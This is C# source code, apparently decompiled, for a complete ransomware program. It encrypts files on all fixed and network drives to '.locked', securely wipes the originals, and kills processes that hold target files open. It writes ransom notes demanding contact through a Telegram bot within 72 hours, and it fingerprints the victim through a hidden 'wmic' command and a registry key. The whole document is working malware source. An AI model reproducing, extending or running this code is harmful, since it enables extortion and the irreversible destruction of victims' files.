using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using EncryptDecrypt;
using Microsoft.Win32;

namespace RunDll_4;

internal class Program
{
	private struct RM_UNIQUE_PROCESS
	{
		public int dwProcessId;

		public FILETIME ProcessStartTime;
	}

	private enum RM_APP_TYPE
	{
		RmUnknownApp = 0,
		RmMainWindow = 1,
		RmOtherWindow = 2,
		RmService = 3,
		RmExplorer = 4,
		RmConsole = 5,
		RmCritical = 1000
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct RM_PROCESS_INFO
	{
		public RM_UNIQUE_PROCESS Process;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string strAppName;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
		public string strServiceShortName;

		public RM_APP_TYPE ApplicationType;

		public uint AppStatus;

		public uint TSSessionId;

		[MarshalAs(UnmanagedType.Bool)]
		public bool bRestartable;
	}

	public class CustomSearcher
	{
		public static List<string> GetDirectories(string path, string searchPattern = "*", SearchOption searchOption = SearchOption.AllDirectories)
		{
			if (searchOption == SearchOption.TopDirectoryOnly)
			{
				return new List<string>(Directory.GetDirectories(path, searchPattern));
			}
			List<string> list = new List<string>(GetDirectories(path, searchPattern));
			for (int i = 0; i < list.Count; i++)
			{
				list.AddRange(GetDirectories(list[i], searchPattern));
			}
			return list;
		}

		private static List<string> GetDirectories(string path, string searchPattern)
		{
			try
			{
				return new List<string>(Directory.GetDirectories(path, searchPattern));
			}
			catch (UnauthorizedAccessException)
			{
				return new List<string>();
			}
		}
	}

	private static DriveInfo[] allDrives = DriveInfo.GetDrives();

	private static string Password = "k1j2k3s4z5p6j";

	private static Stopwatch sw = new Stopwatch();

	private static string txtFile = "You are unlucky. The terrible virus has captured your files. \r\nFor decryption, please contact us at \r\nTelegram messadger operator contact http://t.me/decovid19bot ,\r\nEnter your ID in the subject line. And how many computers need to be decrypted. \r\nAttach 1-2 infected files that do not contain importent information (less thet 2mb) \r\nare required to generate the decoder and restore the test file.\r\nHurry up.Time is limited.Attention. (72 hours)\r\nAt the end of this time,the private key for generating \r\nthe decoder will de destroyed. Files will not be restored.\r\nYour id: {IDGEN}\r\n";

	private const int ERROR_SHARING_VIOLATION = 32;

	private const int ERROR_LOCK_VIOLATION = 33;

	private const int RmRebootReasonNone = 0;

	private const int CCH_RM_MAX_APP_NAME = 255;

	private const int CCH_RM_MAX_SVC_NAME = 63;

	private static void Main(string[] args)
	{
		string text = getUUID();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Names", writable: true);
		if (registryKey == null)
		{
			string value = Guid.NewGuid().ToString().ToUpper();
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Names");
			registryKey2.SetValue("ID", value);
			registryKey2.Close();
		}
		else if (registryKey.GetValue("ID") != null)
		{
			text = registryKey.GetValue("ID")!.ToString();
		}
		else
		{
			string text2 = Guid.NewGuid().ToString().ToUpper();
			registryKey.SetValue("ID", text2, RegistryValueKind.String);
			text = text2;
		}
		new List<Task>();
		txtFile = txtFile.Replace("{IDGEN}", text);
		Password = HashSHA1(Password + text);
		try
		{
			DriveInfo[] array = allDrives;
			foreach (DriveInfo driveInfo in array)
			{
				try
				{
					if (driveInfo.DriveType != DriveType.Fixed && driveInfo.DriveType != DriveType.Network)
					{
						continue;
					}
					new List<string[]>();
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					try
					{
						for (int j = 0; j < 10; j++)
						{
							string path = $"{folderPath}\\ATTENTION!!!{j}.txt";
							File.Create(path).Dispose();
							using TextWriter textWriter = new StreamWriter(path);
							textWriter.WriteLine(txtFile);
						}
					}
					catch (Exception ex)
					{
						Log.Write(ex);
					}
					List<string> directories = CustomSearcher.GetDirectories(driveInfo.RootDirectory.FullName);
					directories.Add(driveInfo.RootDirectory.FullName);
					foreach (string item in directories)
					{
						if (item.ToLower().Contains("windows"))
						{
							continue;
						}
						try
						{
							string[] files = Directory.GetFiles(item, "*.*", SearchOption.TopDirectoryOnly);
							encrypt(files);
						}
						catch (Exception ex2)
						{
							Log.Write(ex2);
						}
						finally
						{
							try
							{
								string path2 = item + "\\ATTENTION!!!.txt";
								File.Create(path2).Dispose();
								using TextWriter textWriter2 = new StreamWriter(path2);
								textWriter2.WriteLine(txtFile);
							}
							catch (Exception ex3)
							{
								Log.Write(ex3);
							}
						}
					}
				}
				catch (Exception ex4)
				{
					Console.WriteLine(ex4.Message);
					Log.Write(ex4);
				}
			}
			Process.Start("Desk1.exe");
		}
		catch (Exception ex5)
		{
			Console.WriteLine("______" + ex5.Message);
		}
	}

	public static string HashSHA1(string value)
	{
		SHA1 sHA = SHA1.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(value);
		byte[] array = sHA.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	public static string getUUID()
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "CMD.exe";
		processStartInfo.Arguments = "/C wmic csproduct get UUID";
		process.StartInfo = processStartInfo;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.Start();
		process.WaitForExit();
		string text = process.StandardOutput.ReadToEnd();
		return text.Replace("UUID", "").Replace("\r\r\n", "").Trim();
	}

	private static void encrypt(string[] filePaths)
	{
		try
		{
			foreach (string text in filePaths)
			{
				string outputFile = text + ".locked";
				if (!(Path.GetExtension(text)!.ToLower() != ".locked") || text.ToLower().Contains("desk1.exe") || text.ToLower().Contains("runasdll.exe") || text.ToLower().Contains("ATTENTION!!!".ToLower()))
				{
					continue;
				}
				try
				{
					MyEncryptor myEncryptor = new MyEncryptor(Password);
					myEncryptor.Encrypt(text, outputFile);
					Wipe wipe = new Wipe();
					wipe.WipeFile(text, 5);
				}
				catch (Exception ex)
				{
					if (IsFileLocked(ex))
					{
						checkProcessForLock(text);
						try
						{
							MyEncryptor myEncryptor2 = new MyEncryptor(Password);
							myEncryptor2.Encrypt(text, outputFile);
							Wipe wipe2 = new Wipe();
							wipe2.WipeFile(text, 5);
						}
						catch (Exception ex2)
						{
							Console.WriteLine(ex2.Message);
							Log.Write(ex2);
						}
					}
					Console.WriteLine(ex.Message);
					Log.Write(ex);
				}
			}
		}
		catch (Exception ex3)
		{
			Log.Write(ex3);
		}
	}

	private static void checkProcessForLock(string fileName)
	{
		try
		{
			List<Process> list = WhoIsLocking(fileName);
			foreach (Process item in list)
			{
				if (item.ProcessName.ToLower() != "RunAsDll")
				{
					item.Kill();
				}
			}
			Thread.Sleep(7000);
		}
		catch (Exception)
		{
		}
	}

	private static bool IsFileLocked(Exception exception)
	{
		int num = Marshal.GetHRForException(exception) & 0xFFFF;
		return num == 32 || num == 33;
	}

	[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
	private static extern int RmRegisterResources(uint pSessionHandle, uint nFiles, string[] rgsFilenames, uint nApplications, [In] RM_UNIQUE_PROCESS[] rgApplications, uint nServices, string[] rgsServiceNames);

	[DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
	private static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

	[DllImport("rstrtmgr.dll")]
	private static extern int RmEndSession(uint pSessionHandle);

	[DllImport("rstrtmgr.dll")]
	private static extern int RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In][Out] RM_PROCESS_INFO[] rgAffectedApps, ref uint lpdwRebootReasons);

	public static List<Process> WhoIsLocking(string path)
	{
		string strSessionKey = Guid.NewGuid().ToString();
		List<Process> list = new List<Process>();
		if (RmStartSession(out var pSessionHandle, 0, strSessionKey) != 0)
		{
			throw new Exception("Could not begin restart session.  Unable to determine file locker.");
		}
		try
		{
			uint pnProcInfoNeeded = 0u;
			uint pnProcInfo = 0u;
			uint lpdwRebootReasons = 0u;
			string[] array = new string[1] { path };
			if (RmRegisterResources(pSessionHandle, (uint)array.Length, array, 0u, null, 0u, null) != 0)
			{
				throw new Exception("Could not register resource.");
			}
			switch (RmGetList(pSessionHandle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons))
			{
			case 234:
			{
				RM_PROCESS_INFO[] array2 = new RM_PROCESS_INFO[pnProcInfoNeeded];
				pnProcInfo = pnProcInfoNeeded;
				if (RmGetList(pSessionHandle, out pnProcInfoNeeded, ref pnProcInfo, array2, ref lpdwRebootReasons) == 0)
				{
					list = new List<Process>((int)pnProcInfo);
					for (int i = 0; i < pnProcInfo; i++)
					{
						try
						{
							list.Add(Process.GetProcessById(array2[i].Process.dwProcessId));
						}
						catch (ArgumentException)
						{
						}
					}
					break;
				}
				throw new Exception("Could not list processes locking resource.");
			}
			default:
				throw new Exception("Could not list processes locking resource. Failed to get size of result.");
			case 0:
				break;
			}
		}
		finally
		{
			RmEndSession(pSessionHandle);
		}
		return list;
	}
}
